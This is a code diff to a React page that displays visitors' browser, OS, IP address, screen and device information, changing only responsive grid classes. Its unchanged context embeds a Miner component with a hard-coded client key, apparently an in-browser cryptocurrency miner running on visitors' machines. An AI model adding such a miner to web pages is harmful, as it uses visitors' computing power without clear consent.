@@ -27,25 +27,25 @@ class MainApp extends React.Component{
 				<div className="section1">
 					<div className="container">
 						<div className='row'>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<Browser
 									name={ua.browser.name}
 									version={ua.browser.version}
 								/>
 							</div>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<Os
 									name={ua.os.name}
 									version={ua.os.version}
 								/>
 							</div>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<IPAddress />
 							</div>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<Screen />
 							</div>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<Device
 									architecture={ua.cpu.architecture}
 									model={ua.device.model}
@@ -53,7 +53,7 @@ class MainApp extends React.Component{
 									vendor={ua.device.vendor}
 								/>
 							</div>
-							<div className='col-md-4'>
+							<div className='col-md-6 col-xl-4'>
 								<Miner
 									clientKey={'glxz6EibUmNoRXA6iZSW01hIq84Pw2LC'} 
 								/>
